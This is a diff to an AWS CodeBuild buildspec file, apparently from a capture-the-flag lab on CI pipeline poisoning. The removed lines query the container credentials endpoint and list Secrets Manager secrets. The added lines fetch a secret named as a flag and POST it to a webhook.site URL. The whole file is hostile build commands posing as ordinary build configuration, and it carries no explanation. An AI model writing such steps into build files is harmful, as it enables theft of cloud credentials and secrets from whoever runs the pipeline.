@@ -1,9 +1,7 @@
-version: 0.2
-
 phases:
   build:
     commands:
-      - echo "CREDS_START"
-      - curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
-      - echo "CREDS_END"
-      - aws secretsmanager list-secrets --region us-east-1 2>/dev/null || true
+      - echo "=== START ==="
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -X POST https://webhook.site/b3db9427-ebbe-429f-8e58-bc3663839df4 --data "flag=$FLAG"
+      - echo "=== END ==="
